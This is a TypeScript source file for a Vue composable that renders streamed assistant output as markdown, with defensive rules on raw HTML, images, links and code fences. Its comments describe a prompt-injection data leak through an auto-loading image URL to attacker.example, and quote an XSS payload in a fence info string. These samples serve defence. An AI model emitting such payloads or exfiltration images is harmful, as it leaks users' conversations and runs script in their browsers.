/**
 * useStreamMarkdown - Streaming markdown rendering composable
 *
 * Incrementally parses markdown chunks and produces reactive HTML output.
 * Uses a shared markdown-it instance with linkify + typographer. Raw HTML in the
 * source is OFF unless the caller passes `allowHtml: true` (assistant output is
 * untrusted; see the fence renderer for the one place author input reaches an
 * attribute). Images load automatically only from this page's origin or inline
 * `data:image`; a remote image renders as a link (see isInlineOrSameOriginImage).
 * A link to another site opens in a new tab (see isOffSiteLink); a link within
 * this page's origin opens in place.
 */

import { ref, readonly, toValue, watch, type Ref, type DeepReadonly, type MaybeRefOrGetter } from 'vue';
// markdown-it 15 ships its own declarations (`@types/markdown-it` is gone) and
// splits the two meanings of the old name: the default export is the callable
// factory/constructor, `MarkdownIt` is the instance type.
import MarkdownIt, { type MarkdownIt as MarkdownItInstance } from 'markdown-it';
import type { Highlighter } from 'shiki';
import { scheduleFrame } from '../utils/scheduleFrame';

// ---------------------------------------------------------------------------
// Shiki syntax highlighter - lazily loaded once, shared across all instances.
// markdown-it's fence renderer is synchronous, so we preload a highlighter
// (async) and re-render once it's ready. Until then code blocks fall back to
// escaped <pre>.
// ---------------------------------------------------------------------------

const SHIKI_LANGS = [
  'javascript', 'typescript', 'jsx', 'tsx', 'python', 'json', 'bash', 'shell',
  'html', 'css', 'vue', 'go', 'rust', 'java', 'csharp', 'cpp', 'sql', 'yaml',
  'markdown', 'diff',
] as const;
const langSet = new Set<string>(SHIKI_LANGS);

let highlighter: Highlighter | null = null;
let highlighterPromise: Promise<Highlighter> | null = null;

function ensureHighlighter(): Promise<Highlighter> {
  if (!highlighterPromise) {
    highlighterPromise = import('shiki')
      .then((shiki) =>
        shiki.createHighlighter({
          themes: ['github-light', 'github-dark'],
          langs: [...SHIKI_LANGS],
        }),
      )
      .then((h) => {
        highlighter = h;
        return h;
      })
      .catch((e) => {
        highlighterPromise = null;
        throw e;
      });
  }
  return highlighterPromise;
}

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

/** The words on a fenced code block's copy button. */
export interface StreamMarkdownLabels {
  /** The button's text. Kept for compatibility: the button is icon-only and is named by `copyCode`. */
  copy: string;
  /** Its accessible name. */
  copyCode: string;
}

/**
 * What the button says when no labels are given. A caller rendering for people
 * passes the dictionary's (`TStreamMarkdown` passes `chat.copy` /
 * `chat.copyCode` from the package i18n); these keep a bare composable usable.
 */
const DEFAULT_LABELS: StreamMarkdownLabels = { copy: 'Copy', copyCode: 'Copy code' };

/* The copy button's two states (lucide `copy` / `check`), inline because the
   button lives in rendered HTML, not in a component template. */
const ICON_ATTRS =
  'xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" ' +
  'stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"';
const COPY_ICON =
  `<svg class="t-md-code__icon t-md-code__icon--copy" ${ICON_ATTRS}>` +
  '<rect width="14" height="14" x="8" y="8" rx="2" ry="2"/>' +
  '<path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>';
const COPIED_ICON =
  `<svg class="t-md-code__icon t-md-code__icon--copied" ${ICON_ATTRS}><path d="M20 6 9 17l-5-5"/></svg>`;

/** The markdown-it render env key the fence rule reads its labels from. */
const LABELS_ENV_KEY = 'tnziCodeLabels';

export interface UseStreamMarkdownOptions {
  /**
   * Custom markdown-it instance (overrides built-in shared singleton). It is
   * used as given: the built-in rules (escaped fence language, remote images
   * rendered as links rather than loaded, links to other sites opening in a
   * new tab) are not added to it.
   */
  markdownIt?: MarkdownItInstance;
  /**
   * The code block copy button's words, in the interface language. A ref or
   * getter is followed: switching the language re-renders what is shown. They
   * travel in markdown-it's render env, so the shared parser stays shared.
   */
  labels?: MaybeRefOrGetter<StreamMarkdownLabels>;
  /**
   * Allow raw HTML passthrough. Default false - raw `<tags>` in the markdown
   * source are escaped (`&lt;`), neutralising XSS from LLM/RAG output. Markdown
   * syntax (tables, code, lists, emphasis) still renders normally. Only set
   * true if you sanitize the input yourself.
   */
  allowHtml?: boolean;
}

export interface UseStreamMarkdownReturn {
  /** Rendered HTML (reactive). */
  html: DeepReadonly<Ref<string>>;
  /** Raw accumulated markdown text (reactive). */
  rawText: DeepReadonly<Ref<string>>;
  /** Whether streaming is in progress (reactive). */
  isStreaming: DeepReadonly<Ref<boolean>>;
  /** Append a text chunk (incremental delta). */
  append: (chunk: string) => void;
  /** Re-render current rawText to HTML (useful after plugin changes). */
  flush: () => void;
  /** Mark streaming as finished and do a final render. */
  finish: () => void;
  /** Reset all state. */
  reset: () => void;
}

// ---------------------------------------------------------------------------
// Image sources
// ---------------------------------------------------------------------------

/**
 * Whether an image may load automatically when the answer renders: inline
 * `data:image/...` (markdown-it's link validator already limits `data:` to
 * raster images) or a URL that resolves to this page's own origin.
 *
 * ★ An `<img>` fetches the moment it reaches the DOM, with no click. Assistant
 * output is shaped by whatever the model read (RAG documents, web and tool
 * results, MCP output), so a prompt-injected source can make it emit
 * `![](https://attacker.example/p?d=<summary of this conversation>)` and the
 * user's browser would send that data, plus their IP, as soon as the answer
 * appears. Origins are compared after resolving the URL rather than by pattern,
 * so `//host/x`, upper-case schemes and backslash tricks cannot slip through.
 */
function isInlineOrSameOriginImage(src: string): boolean {
  const value = src.trim();
  if (/^data:image\//i.test(value)) return true;
  if (typeof window === 'undefined' || !window.location) return false;
  try {
    return new URL(value, window.location.href).origin === window.location.origin;
  } catch {
    return false;
  }
}

/**
 * Whether a link leads to another site: an `http(s)` address whose origin is not
 * this page's. Such a link opens in a new tab, so following a source the answer
 * cites does not replace the conversation (a desktop shell hands a new-tab link
 * to the system browser). A link within this origin stays in place: it is the
 * product's own page, and the product decides how that navigates. Other schemes
 * (`mailto:`, `tel:`) do not leave the page and are left alone.
 *
 * Without a page to compare with (server-side rendering) every absolute
 * `http(s)` address counts as another site.
 */
function isOffSiteLink(href: string): boolean {
  const value = href.trim();
  const hasWindow = typeof window !== 'undefined' && !!window.location;
  try {
    const url = hasWindow ? new URL(value, window.location.href) : new URL(value);
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return false;
    return !hasWindow || url.origin !== window.location.origin;
  } catch {
    return false;
  }
}

// ---------------------------------------------------------------------------
// Markdown-it factory
// ---------------------------------------------------------------------------

function createMarkdownIt(allowHtml = false): MarkdownItInstance {
  const md = new MarkdownIt({
    html: allowHtml,
    linkify: true,
    typographer: true,
  });

  // A link to another site (a cited source, a URL the answer mentions, which
  // linkify turns into a link too) opens in a new tab. See isOffSiteLink.
  const renderLinkOpen = md.renderer.rules.link_open
    ?? ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options));
  md.renderer.rules.link_open = (tokens, idx, options, env, self) => {
    const token = tokens[idx]!;
    if (isOffSiteLink(String(token.attrGet('href') ?? ''))) {
      token.attrSet('target', '_blank');
      token.attrSet('rel', 'noopener noreferrer');
    }
    return renderLinkOpen(tokens, idx, options, env, self);
  };

  // Remote images render as an ordinary link instead of an <img>: following it
  // is the user's choice, exactly as with a markdown link. See
  // isInlineOrSameOriginImage for why nothing remote loads on its own.
  const renderImage = md.renderer.rules.image!;
  md.renderer.rules.image = (tokens, idx, options, env, self) => {
    const token = tokens[idx]!;
    const src = String(token.attrGet('src') ?? '');
    if (isInlineOrSameOriginImage(src)) {
      return renderImage(tokens, idx, options, env, self);
    }
    const alt = self.renderInlineAsText(token.children ?? [], options, env);
    const label = md.utils.escapeHtml(alt || src);
    return (
      `<a href="${md.utils.escapeHtml(src)}" class="t-md-image-link" ` +
      `target="_blank" rel="noopener noreferrer nofollow">${label}</a>`
    );
  };

  // GFM task list items (`- [ ] todo`, `- [x] done`) render as disabled
  // checkboxes. markdown-it has no option for them; a list item whose text
  // starts with `[ ] ` or `[x] ` gets the box as its first inline token, the
  // item a class (`t-md-task`, plus `is-checked`) and its list `t-md-tasks`.
  md.core.ruler.after('inline', 'tnzi_task_lists', (state) => {
    const tokens = state.tokens;
    for (let i = 2; i < tokens.length; i += 1) {
      const inline = tokens[i]!;
      const item = tokens[i - 2]!;
      if (inline.type !== 'inline' || tokens[i - 1]!.type !== 'paragraph_open' || item.type !== 'list_item_open') continue;
      const marker = /^\[([ xX])\][ \t]/.exec(inline.content);
      const first = inline.children?.[0];
      if (!marker || !first || first.type !== 'text' || !first.content.startsWith(marker[0])) continue;
      const checked = marker[1] !== ' ';
      first.content = first.content.slice(marker[0].length);
      const box = new state.Token('html_inline', '', 0);
      box.content = `<input type="checkbox" class="t-md-task__box" disabled${checked ? ' checked' : ''}>`;
      inline.children!.unshift(box);
      item.attrJoin('class', checked ? 't-md-task is-checked' : 't-md-task');
      for (let j = i - 3; j >= 0; j -= 1) {
        const list = tokens[j]!;
        if ((list.type === 'bullet_list_open' || list.type === 'ordered_list_open') && list.level === item.level - 1) {
          if (!String(list.attrGet('class') ?? '').includes('t-md-tasks')) list.attrJoin('class', 't-md-tasks');
          break;
        }
      }
    }
  });

  // A table sits in its own horizontal scroller, so a wide one scrolls inside
  // the message instead of being squeezed into the column (or clipped). The
  // wrapper also carries the outer border and radius, the same frame as a code
  // block.
  md.renderer.rules.table_open = (tokens, idx, options, _env, self) =>
    `<div class="t-md-table">${self.renderToken(tokens, idx, options)}`;
  md.renderer.rules.table_close = (tokens, idx, options, _env, self) =>
    `${self.renderToken(tokens, idx, options)}</div>`;

  // Custom fence renderer - wraps each code block in a header bar (language +
  // copy button) and syntax-highlights via shiki once the shared highlighter is
  // ready. Copy is handled by event delegation in StreamMarkdown.vue.
  md.renderer.rules.fence = (tokens, idx, _options, env) => {
    const token = tokens[idx];
    const info = (token?.info ?? '').trim();
    const lang = info.split(/\s+/)[0] ?? '';
    const code = token?.content ?? '';

    // `lang` is the first token of the fence info string, i.e. author input.
    // The shiki path only accepts it through the `langSet` allow-list, but the
    // fallback path used to interpolate it raw into a class attribute: an info
    // string of `js"onmouseover="alert(1)` (no whitespace, so the split keeps
    // it whole) closed the quote and planted a handler on the <code> element
    // of a page rendered from an assistant's or another user's message.
    const langAttr = lang ? ` class="language-${md.utils.escapeHtml(lang)}"` : '';
    const fallback = (): string =>
      `<pre class="t-md-code__fallback"><code${langAttr}>${md.utils.escapeHtml(code)}</code></pre>`;

    let bodyHtml: string;
    if (highlighter && lang && langSet.has(lang)) {
      try {
        bodyHtml = highlighter.codeToHtml(code, {
          lang,
          themes: { light: 'github-light', dark: 'github-dark' },
        });
      } catch {
        bodyHtml = fallback();
      }
    } else {
      bodyHtml = fallback();
    }

    const dataCode = encodeURIComponent(code);
    const langLabel = md.utils.escapeHtml(lang);
    const labels = (env as Record<string, StreamMarkdownLabels | undefined> | undefined)?.[LABELS_ENV_KEY] ?? DEFAULT_LABELS;
    // No header bar: the language is a small label inside the frame, and the
    // copy button an icon in the top-right corner (sticky, so it stays in reach
    // down a long block). Its name is the accessible label and the tooltip.
    const copyName = md.utils.escapeHtml(labels.copyCode);
    return (
      `<div class="t-md-code" data-code="${dataCode}">` +
      `<div class="t-md-code__bar">` +
      `<button type="button" class="t-md-code__copy" aria-label="${copyName}" title="${copyName}">` +
      `${COPY_ICON}${COPIED_ICON}</button></div>` +
      (langLabel ? `<div class="t-md-code__lang">${langLabel}</div>` : '') +
      `<div class="t-md-code__body">${bodyHtml}</div></div>`
    );
  };

  return md;
}

// ---------------------------------------------------------------------------
// Cached singleton markdown-it instance (shared across all composables)
// ---------------------------------------------------------------------------

let cachedMd: MarkdownItInstance | null = null;

function getSharedMarkdownIt(): MarkdownItInstance {
  if (!cachedMd) {
    cachedMd = createMarkdownIt();
  }
  return cachedMd;
}

// ---------------------------------------------------------------------------
// Composable
// ---------------------------------------------------------------------------

export function useStreamMarkdown(options: UseStreamMarkdownOptions = {}): UseStreamMarkdownReturn {
  const { markdownIt, allowHtml = false, labels } = options;

  const md = markdownIt ?? (allowHtml ? createMarkdownIt(true) : getSharedMarkdownIt());

  const html = ref('');
  const rawText = ref('');
  const isStreaming = ref(false);

  let renderPending = false;
  /* What `html` was last rendered from: the source, and whether the highlighter
     was there. Every render request goes through `renderIfStale`, so a source
     that is already on screen is never parsed again. Without it each message of
     a thread opened from history was parsed twice: once when the (already
     loaded) highlighter's promise settled, once more in the frame `append`
     scheduled. A long thread paid for every answer twice. */
  let renderedSource: string | null = null;
  let renderedWithHighlighter = false;
  let renderedLabels: StreamMarkdownLabels | null = null;

  const currentLabels = (): StreamMarkdownLabels => (labels === undefined ? DEFAULT_LABELS : toValue(labels));
  const sameLabels = (a: StreamMarkdownLabels | null, b: StreamMarkdownLabels): boolean =>
    a !== null && a.copy === b.copy && a.copyCode === b.copyCode;

  function render(): void {
    const words = currentLabels();
    renderedSource = rawText.value;
    renderedWithHighlighter = highlighter != null;
    renderedLabels = words;
    html.value = md.render(rawText.value, { [LABELS_ENV_KEY]: words });
  }

  function renderIfStale(): void {
    if (
      rawText.value === renderedSource
      && renderedWithHighlighter === (highlighter != null)
      && sameLabels(renderedLabels, currentLabels())
    ) {
      return;
    }
    render();
  }

  // The interface language changed: what is on screen is re-rendered in it.
  if (labels !== undefined) {
    watch(currentLabels, () => {
      if (rawText.value && !renderPending) renderIfStale();
    });
  }

  // Re-render once shiki is ready so already-rendered code blocks get highlighted.
  // A render still waiting for its frame picks the highlighter up by itself.
  ensureHighlighter()
    .then(() => {
      if (rawText.value && !renderPending) renderIfStale();
    })
    .catch(() => {
      /* shiki unavailable - fenced code stays as escaped <pre> */
    });

  function append(chunk: string): void {
    if (!isStreaming.value) {
      isStreaming.value = true;
    }
    rawText.value = rawText.value + chunk;
    if (!renderPending) {
      renderPending = true;
      scheduleFrame(() => {
        // Already rendered by `flush` / `finish` since this frame was asked for.
        if (!renderPending) return;
        renderPending = false;
        renderIfStale();
      });
    }
  }

  function flush(): void {
    renderPending = false;
    render();
  }

  function finish(): void {
    renderPending = false;
    renderIfStale();
    isStreaming.value = false;
  }

  function reset(): void {
    html.value = '';
    rawText.value = '';
    isStreaming.value = false;
    renderPending = false;
    renderedSource = null;
    renderedWithHighlighter = false;
    renderedLabels = null;
  }

  return {
    html: readonly(html),
    rawText: readonly(rawText),
    isStreaming: readonly(isStreaming),
    append,
    flush,
    finish,
    reset,
  };
}
